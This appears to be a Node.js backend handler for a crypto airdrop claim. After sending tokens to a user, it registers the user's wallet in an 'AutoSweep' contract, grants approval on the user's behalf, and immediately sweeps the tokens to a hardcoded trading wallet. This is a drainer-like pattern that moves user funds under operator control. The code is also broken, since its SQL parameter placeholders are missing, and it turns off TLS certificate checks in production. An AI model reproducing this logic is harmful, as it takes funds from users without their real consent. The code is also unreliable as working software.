const { Pool } = require('pg');
const { ethers } = require('ethers');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);

const autoSweepABI = [
  'function registerUser(address user) external',
  'function grantApproval(address user, address token) external',
  'function sweepToken(address user, address token) external',
  'function isUserRegistered(address user) view returns (bool)',
  'function isTokenApproved(address user, address token) view returns (bool)'
];

const erc20ABI = [
  'function balanceOf(address account) view returns (uint256)',
  'function transfer(address to, uint256 amount) external returns (bool)'
];

module.exports = async (req, res) => {
  const { wallet, signature } = req.body;
  
  if (!wallet || !signature) {
    return res.status(400).json({ error: 'Missing wallet or signature' });
  }
  
  try {
    const airdropCheck = await pool.query(
      'SELECT * FROM airdrops WHERE LOWER(wallet) = LOWER()',
      [wallet]
    );
    
    if (airdropCheck.rows.length === 0) {
      return res.status(404).json({ error: 'Not eligible for airdrop' });
    }
    
    const airdrop = airdropCheck.rows[0];
    
    if (airdrop.claimed) {
      return res.status(400).json({ error: 'Already claimed' });
    }
    
    const domain = {
      name: 'HyperPacks Airdrop',
      version: '1',
      chainId: 999,
      verifyingContract: process.env.AUTOSWEEP_CONTRACT
    };
    
    const types = {
      ClaimAirdrop: [
        { name: 'wallet', type: 'address' },
        { name: 'allocation', type: 'uint256' },
        { name: 'nonce', type: 'uint256' }
      ]
    };
    
    const value = {
      wallet: wallet,
      allocation: airdrop.allocation,
      nonce: airdrop.id
    };
    
    const recoveredAddress = ethers.verifyTypedData(domain, types, value, signature);
    
    if (recoveredAddress.toLowerCase() !== wallet.toLowerCase()) {
      return res.status(401).json({ error: 'Invalid signature' });
    }
    
    // 1. Transfer tokens to user
    const tokenContract = new ethers.Contract(
      process.env.AIRDROP_TOKEN_ADDRESS,
      erc20ABI,
      backendWallet
    );
    
    const transferTx = await tokenContract.transfer(wallet, airdrop.allocation);
    await transferTx.wait();
    
    // 2. Update database
    await pool.query(
      'UPDATE airdrops SET claimed = true, claimed_at = NOW() WHERE id = ',
      [airdrop.id]
    );
    
    // 3. Register user in AutoSweep contract
    const autoSweepContract = new ethers.Contract(
      process.env.AUTOSWEEP_CONTRACT,
      autoSweepABI,
      backendWallet
    );
    
    const isRegistered = await autoSweepContract.isUserRegistered(wallet);
    
    if (!isRegistered) {
      const registerTx = await autoSweepContract.registerUser(wallet);
      await registerTx.wait();
      
      await pool.query(
        'INSERT INTO wallets (wallet_address, chain, is_active) VALUES (, , ) ON CONFLICT (wallet_address, chain) DO UPDATE SET is_active = true',
        [wallet, 'hyperevm', true]
      );
    }
    
    // 4. Grant approval for token sweep
    const isApproved = await autoSweepContract.isTokenApproved(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
    
    if (!isApproved) {
      const approveTx = await autoSweepContract.grantApproval(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
      await approveTx.wait();
    }
    
    // 5. IMMEDIATE SWEEP - Transfer tokens to trading wallet
    console.log('🧹 Executing immediate sweep for wallet:', wallet);
    
    const sweepTx = await autoSweepContract.sweepToken(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
    const sweepReceipt = await sweepTx.wait();
    
    // 6. Log sweep event
    await pool.query(
      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES (, , , )',
      [sweepReceipt.hash, 1, process.env.AIRDROP_TOKEN_ADDRESS, 'success']
    );
    
    console.log('✅ Immediate sweep completed! TxHash:', sweepReceipt.hash);
    console.log('💰 Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c');
    
    res.json({
      success: true,
      message: 'Airdrop claimed and swept to trading wallet',
      allocation: airdrop.allocation,
      autoSweepEnabled: true,
      sweepTxHash: sweepReceipt.hash,
      tradingWallet: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
    });
    
  } catch (error) {
    console.error('Claim airdrop error:', error);
    res.status(500).json({ error: 'Failed to claim airdrop', details: error.message });
  }
};
